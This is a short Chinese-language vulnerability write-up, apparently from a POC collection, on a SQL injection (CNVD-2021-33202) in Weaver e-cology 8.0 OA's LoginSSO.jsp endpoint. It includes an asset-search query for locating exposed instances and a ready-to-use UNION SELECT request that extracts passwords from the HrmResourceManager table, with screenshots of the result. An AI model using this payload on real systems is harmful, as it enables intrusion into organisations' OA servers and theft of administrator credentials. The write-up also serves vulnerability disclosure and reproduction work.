# 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202

## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。
泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。

## 漏洞影响

<a-checkbox checked>泛微e-cology 8.0</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-协同办公OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1636962061131-2d870e8d-e15c-4864-8d36-69bd1f57d746-20220313184449317.png)

验证POC

```php
/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
```

![img](../../../.vuepress/public/img/1636962109612-27c439fe-00a4-4d90-89ca-737b2ce98400.png)